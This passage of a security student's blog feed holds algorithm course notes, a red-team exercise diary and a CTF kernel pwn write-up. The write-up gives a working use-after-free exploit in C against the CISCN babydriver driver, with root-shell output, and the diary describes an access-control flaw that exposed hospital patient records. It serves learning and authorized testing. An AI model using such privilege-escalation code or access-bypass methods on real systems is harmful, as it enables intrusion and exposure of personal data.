    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(0)</title>
    <link href="https://zjw1nd.github.io/2024/10/28/Algorithm-0/"/>
    <id>https://zjw1nd.github.io/2024/10/28/Algorithm-0/</id>
    <published>2024-10-28T08:20:57.000Z</published>
    <updated>2024-12-02T09:16:28.851Z</updated>
    
    <content type="html"><![CDATA[<h1>C++模板库的使用</h1><p>主要包括：</p><ol><li class="lvl-3">序列式容器：array（定长），vector（单向插入），deque（双向插入），list（双向链表），forwardlist（单向链表）</li><li class="lvl-3">关联式容器（节点组成的红黑树）：set（集合，有序存储互异元素），multiset（允许相等），map（键值对，字典/hashmap），multimap（允许key相等）</li><li class="lvl-3">无序（关联式容器）：unordered_set/multiset, unordered_map/multimap，无序，只关心存在</li></ol><h2 id="基础，熟悉输入输出">基础，熟悉输入输出</h2><ul class="lvl-0"><li class="lvl-2"><p>size clear等基本方法</p></li><li class="lvl-2"><p>迭代器</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = data.<span class="built_in">begin</span>(); iter != data.<span class="built_in">end</span>(); iter++)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> iter=data.<span class="built_in">begin</span>();...;...)</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>scanf输入 printf输出 在C++中使用他们也更好</p></li><li class="lvl-2"><p>长字符串换行</p></li><li class="lvl-2"><p>开double 开longlong</p></li></ul><h1>基础算法</h1><blockquote><p>main函数必须是int返回必须return0</p></blockquote><h2 id="暴力破解">暴力破解</h2><p>枚举骗分</p><p>包含头文件<code>#include&lt;algorithm&gt;</code>，里面有常用的容器算法，包括排序，查找等等，不用造轮子。</p><p>头文件<code>#include&lt;ctype.h&gt;</code>包含大小写转换，字母数字判断</p><p>打表，用事先写好的常量字符串优化程序</p><h2 id="模拟">模拟</h2><h1>课堂算法分析笔记Lesson1</h1><h2 id="背包问题的求解">背包问题的求解</h2><p>贪心</p><h2 id="多项式时间算法">多项式时间算法</h2><p>输入长度翻倍，运行时间最多会慢常数倍。也就是说，我们不希望随着n的增长，多消耗的时间被n影响太多。1：1的增长已经很好了。多项式算法中，a和b通常不会太大</p><h2 id="渐进分析">渐进分析</h2><ul class="lvl-0"><li class="lvl-2"><p>渐进上界：$O(g(n))$意味着，对于fn来说，存在一个足够大的c和n0，满足任意的$n&gt;=n_0$，$0&lt;=f(n)&lt;=cg(n)$。“最差情形”</p></li><li class="lvl-2"><p>渐进下界：同理的说法，存在c在n足够大的时候…</p></li><li class="lvl-2"><p>渐进紧界：既是又是，例子：fn=32n2+17n+1，n2既是上界又是下界</p></li></ul><blockquote><p>任何基于比较的排序算法最差情况下都需要比较至少$O(nlogn)$次 —-这是错的时间复杂度的限制并不限制做几遍，logn我二分查10次也是logn<br>循环数组查找：可以确定拐点加左右二分</p></blockquote><h1>Lesson2 图</h1><ul class="lvl-0"><li class="lvl-2"><p>连通性问题</p></li><li class="lvl-2"><p>最短路径</p></li><li class="lvl-2"><p>搜索<br>BFS树：按BFS搜索顺序（每一层Li画树的一层），中间连虚线（可以不画）</p></li></ul><blockquote><p>结论：原图中有边的两个点在BFS树中层数至多相差1<br>停止：所有当前轮次的点的邻居都已经出现在已搜索过的点集里<br>事实上，只要通过一个确定性的步骤（未必是BFS,DFS），每次找邻居，总能找到所有点。只是代码逻辑会清晰</p></blockquote><p>连通分支：一个<strong>点集</strong>而非一个子图。包含S的连通分支指从s出发能到达的点集</p><p>DFS树</p><p>有向图，强连通（相互可到达）——强连通的判断（Kosaraju算法，反向边两次BFS）为什么？</p><p>有向无环图（DAG）和拓扑排序：如果g中包含一个拓扑排序，则G必定是一个有向无环图</p><p><strong>如何选择数据结构：看我们在干嘛，增删查改哪个更多，不同的数据结构擅长不同的操作</strong> 如DAG的拓扑排序：总是查找某个（入边）量最小的点–优先队列</p><h1>Lesson3 贪心</h1><p>大方向只有 贪心 分治 动态规划<br>按某种顺序排序，贪心的关键是确定比较的依据</p><h2 id="区间调度问题">区间调度问题</h2><p>记一下最少冲突区间的反例图<br>算法反例 必考</p><p>反证最早完成时间是最优策略：假设它不最优然后和最优对比，找最开始不一样的一项</p><p><strong>保持领先证明贪心算法的任意性/最优解</strong>：和一个假想的”最优解”相比，采用该算法在每一步都不会获得更差的结果，即可说明该算法最优，递推证明，第一步…第k步都对了，第k+1步也是对的</p><p><strong>最小化延迟调度</strong>倒置？</p><blockquote><p>如果有倒置那么必定有相邻倒置：反证，对任意一个不相邻的倒置a和b,那么两者之间夹的任务要么和a倒置要么和b倒置，要么，c比a早和a出现倒置，要么c比a晚和b倒置然后，交换两个相邻倒置，不会对延迟有任何增大的变化并且会减少倒置</p></blockquote><p><strong>交换论证证明贪心算法的任意性/最优解:</strong> 和一个任意序列相比，通过按照我们的贪心指标交换两个该序列的元素让结果更靠近我们的算法而且结果并不会更差。反复交换即可说明我们的算法是最优解。反证证明，对任意序列按指标两两交换直到结果是我们的贪心策略。</p><h1>Lesson4 分治</h1><p>递推 f(n)=2f(n/2)+O(n) nlogn的来历每层的“治”都是On合并，一共有logn层，画递归树</p><p>不同的a和b要会算总的复杂度 f(n)=af(n/b)+O(n)，递推</p><p>如果是f(n)=T(n)+O(n2)，那么结果是n方而非n方logn</p><h2 id="逆序对计算">逆序对计算</h2><p>暴力:n^2扫描</p><p>分治：拆开算之后，关键是统计合并起来有多少逆序对。先排序之后然后指针扫描一遍，因为排好了所以右侧的全部逆序，扫一遍On即可。</p><p>归并排序</p><h2 id="最近点对问题">最近点对问题</h2><h2 id="主定理">主定理</h2><p>常见分治递归的通解：三个分治算法的参数abf$T(n)=aT(n/b)+f(n)$，分别对应子问题数量，大小减小规模，组合子问题的复杂度</p><p>通项公式——几何级数求和（等比数列）。见ppt，判断r和1的大小关系，只对n的c次幂适用</p><h2 id="分治乘法">分治乘法</h2><h1>Lesson5 动态规划DP</h1><blockquote><p>解过的不要再解</p></blockquote><h2 id="加权区间调度">加权区间调度</h2><p>找最大权重子集。我们没有通项，但是希望能用目标结果的更小下标的递推式表示</p><p>选择第j项？不选第j项？逐个缩减问题规模。我们总是希望将OPT(n)用1-n-1表示，然后对n讨论。</p><h3 id="暴力">暴力</h3><p>本质是有一些顺序的枚举。最好最坏情况？能缩减更多规模的机会 最差$2^n$，递归二叉树</p><h3 id="自顶向下动态规划（备忘录）">自顶向下动态规划（备忘录）</h3><p>模拟一次递归返回的过程。暂存子问题j的结果在M[j]中，瓶颈在排序，最后就遍历一遍就行了。</p><h2 id="背包问题">背包问题</h2><p>贪心的核心是排序指标，DP的核心是定义重叠子问题</p><p>同时考虑物品和包重量。如果不选i,那就是<code>OPT(i-1,w)</code>，如果选了，就对应缩小包的空间<code>OPT(I-1,w-wi)+Vi</code>。填一张二维的表</p><p>回溯看来源，时间复杂度$O(nW)$，W是输入的变量，不代表他关于n是多项式时间。但是算法严重依赖于重量是整数的假设。</p><h2 id="字符串对齐">字符串对齐</h2><h1>Lesson6 最小流和最大割</h1><p>并查集？？唉</p><h1>LessonN 线段树</h1><p>堆式存储 查询2logn求和</p><p>Lazy Tag 对上负责？</p><p>每一行最多只有两个蓝色区间和2个红色区间</p><p>批量修改会在能覆盖的地方就停，然后直到下次查询再修改。</p><p>多个lazy tag,优先高的先下传</p><p>统计量可合并可以使用</p><h2 id="树状数组">树状数组</h2><p>无需额外空间 长度仍然n<br>修改对应位置 线段树加前缀</p><h1>Lesson N+1 kmp算法——字符串匹配</h1><p>依据一张部分匹配表快速跳过$O(m+n)$</p><h1>多项式时间规约</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;C++模板库的使用&lt;/h1&gt;
&lt;p&gt;主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li class=&quot;lvl-3&quot;&gt;序列式容器：array（定长），vector（单向插入），deque（双向插入），list（双向链表），forwardlist（单向链表）&lt;/li&gt;
&lt;li class=</summary>
      
    
    
    
    
    <category term="算法" scheme="https://zjw1nd.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>记录一次护网行动</title>
    <link href="https://zjw1nd.github.io/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/"/>
    <id>https://zjw1nd.github.io/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/</id>
    <published>2024-10-18T11:17:47.000Z</published>
    <updated>2024-10-19T03:32:36.416Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面</h1><p>首先这次的体验就两个字：<strong>坐牢</strong>。先不说会不会能不能打，整个承办体验极差。收手机（为此还前一天收了一部，起了大作用了）。除了收手机以外，还不让用自己的电脑，给的电脑配置很差，空间也就装一个虚拟机。还要梯子，反正就是恶心完了。</p><h1>Web渗透大概记录一下</h1><blockquote><p>“内网渗透的本质是信息搜集”</p></blockquote><p>首先感谢xzj师傅的工具。Web方向的工具也太多了，甚至还有集成好的虚拟机环境，各个GUI做的都牛逼的不行（Yakit），一键扫描一键搜集一键测poc，感叹web吃的也太好了。</p><h2 id="工具">工具</h2><p>最后搞了半天就bp最熟，另一个用的最多的就是轻量化的dudesuite，fofa和重放就够了。信息搜集密探似乎最好用可惜后期才发现。awvs看起来也牛逼但是没用到。</p><h2 id="代理池">代理池</h2><p>第一天没什么进展，中医院的OA指纹识别后测POC发两次就被ban ip，不懂还以为是玩不起，后来问学长和裁判才了解到应该是物理的小盒WAF。不走域名的话测poc被ban一般就要么配代理池要么换目标了。</p><p>代理池又折腾了几天，开始说要一个vps来，要来了也没啥用，CentOS上面什么也没有自己还得配环境，手动编译python装一年装好了还不能用一拖史。整个攻击的网络都是内网，出口ip一样，没有ipv6网段，v4的公网ip自己就不能乱写了。第三天大部分时间在折腾这个，终于放弃了，从网上买新用户白嫖的来发包测poc（到中期都没有能直连访问的了，要么开自己梯子要么代理池）。</p><h2 id="成果">成果</h2><p>第二天从学长了解到上次中医院挖了小程序的越权。这次也试试，主要目标都防护太厉害了。然后学了一手小程序抓包（Proxifier代理有点厉害，进程指定），然后开始人工审计流量（上次也是这么干的）。没想到还真让我审到了，各个接口一个个乱试的时候发现，查地址的时候就算把Token字段全删掉也返回200，测试了一下果然，只认GET里的UserId手机号，token是假的…遂喊人注册验证，果然平行越权随便查。各个接口测一遍下来，只有关联的就诊人这个最敏感的（身份证）有验证，地址和就诊记录都不看Token，太抽象了。<br><img src="/images/hvv/poc1.png" alt="poc1.png"></p><p><img src="/images/hvv/poc2.png" alt="poc2.png"></p><p>交涉3天后拿到1500分，按200w+的数据算了，最后也比武大高，小win</p><p>最后绝大部分还是先弱口令/社工/钓鱼的内网突破，就算没有这些也大部分都是弱口令拿分。我们一个都没找到，发现的都像是蜜罐。</p><h1>anyway</h1><p>不熟悉任何的常见框架，webfuzz，漏洞挖掘，代码审计。人工审小程序硬是拿了1500也算不错了。主要还是不熟悉真实的渗透流程和体系化的那种操作。密探里有一张备忘图就很好。信息搜集该干什么，网站拿到了根据注册框、敏感信息等等我们能做什么攻击测试，有漏洞之后怎么利用最后进入内网等等。前期的准备和信息搜集太少了基本是无头苍蝇，在没用的地方浪费了很多时间。还得是快速找弱口令突破口，另外教程得找同样的护网记录给思路。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;首先这次的体验就两个字：&lt;strong&gt;坐牢&lt;/strong&gt;。先不说会不会能不能打，整个承办体验极差。收手机（为此还前一天收了一部，起了大作用了）。除了收手机以外，还不让用自己的电脑，给的电脑配置很差，空间也就装一个虚拟机。还要梯子，反正就是恶</summary>
      
    
    
    
    <category term="Web" scheme="https://zjw1nd.github.io/categories/Web/"/>
    
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="hvv" scheme="https://zjw1nd.github.io/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门之2015-AliCrackme</title>
    <link href="https://zjw1nd.github.io/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/"/>
    <id>https://zjw1nd.github.io/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/</id>
    <published>2024-10-14T11:18:51.000Z</published>
    <updated>2024-11-20T06:31:44.034Z</updated>
    
    <content type="html"><![CDATA[<h1>参考实验报告</h1><p>简单的分析，内存dump或者反调试patch。多用dd直接dump内存</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;参考实验报告&lt;/h1&gt;
&lt;p&gt;简单的分析，内存dump或者反调试patch。多用dd直接dump内存&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Android" scheme="https://zjw1nd.github.io/tags/Android/"/>
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Kernel Pwn从入门到入土-2</title>
    <link href="https://zjw1nd.github.io/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/"/>
    <id>https://zjw1nd.github.io/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/</id>
    <published>2024-10-11T08:28:17.000Z</published>
    <updated>2024-11-20T07:46:49.673Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫<code>babydev</code>的字符设备。</p><p>这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛：</p><h2 id="init-sh-qemu参数：">init.sh-qemu参数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio </span><br><span class="line">-kernel bzImage </span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor /dev/null </span><br><span class="line">-m 64M </span><br><span class="line">--nographic </span><br><span class="line">-smp cores=1,threads=1 </span><br><span class="line">-cpu kvm64,+smep <span class="comment"># 开启了smep</span></span><br></pre></td></tr></table></figure><h2 id="open">open</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);<span class="comment">//</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fentry不用管，是编译的时候gcc在函数入口插入的东西。</p><p>open这个驱动会将buf初始化, 调用<code>kmem_cache_alloc_trace</code>分配一个0x40的object。这个函数也是抽象好几层后的了，我们后面再谈linux内核的内存分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read和write">read和write</h2><p>没什么差别，直接复制数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ioctl">ioctl</h2><p>ioctl提供了一个调用kmalloc重新分配buf的接口，这里的v4是我们用户态可以控制的参数，也就是说可以重新分配size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="release">release</h2><p>对于正常的驱动，release函数会在文件关闭的时候触发。但是这个函数没有在data段开头的file_operations里注册，反而在<code>__mount_loc</code>节中查到了引用，不知道怎么触发的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>release有一个UAF，kfree但全局变量指针不置空。</p><p>总体来看涉及kmalloc和kfree, 可能与内核的堆利用有关。所以下面先介绍一下内核的内存管理机制。</p><blockquote><p>篇幅考虑，相关内容单开了一篇blog，<a href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">点此跳转</a></p></blockquote><h1>UAF</h1><blockquote><p>参考自 <a href="https://www.anquanke.com/post/id/259252#h2-2">在2021年再看ciscn2017 babydriver</a></p></blockquote><h2 id="1-简单粗暴——4-4-72版本uaf必定导致提权">1. 简单粗暴——4.4.72版本uaf必定导致提权</h2><p>如果了解了slab我们就能知道，在kfree后这个object会被放回其原本的list中（比如kmem_cpu_cache的slab列表），并且freelist的第一个也会指向它。也就是说我们能够保证，只要free进去后没有别的操作连续申请相同大小的对象，下一次一定会返回这一个。</p><p>知道了这个我们就有很多的利用方法了。一种比较简单的方法就是把它改成cred的大小然后用户态fork起shell，通过UAF直接改掉euid。这个漏洞在kernel 4.4.72是可用的，显然是因为内核并没有相关的检查——至少这道题的内核没有</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">/ $ ./ez_uaf</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[   11.928864] device open</span><br><span class="line">[   11.929808] device open</span><br><span class="line">[   11.931073] alloc <span class="keyword">done</span></span><br><span class="line">[   11.932012] device release</span><br><span class="line">[+] Successful to get the root. Execve root shell now...</span><br><span class="line">/ <span class="comment"># ls</span></span><br><span class="line">bin          dev          ez_uaf.c     lib          root         sys</span><br><span class="line">boot.sh      etc          home         linuxrc      rootfs.cpio  tmp</span><br><span class="line">bzImage      ez_uaf       init         proc         sbin         usr</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// cred大小</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">// the child thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>); <span class="comment">// UAF </span></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">     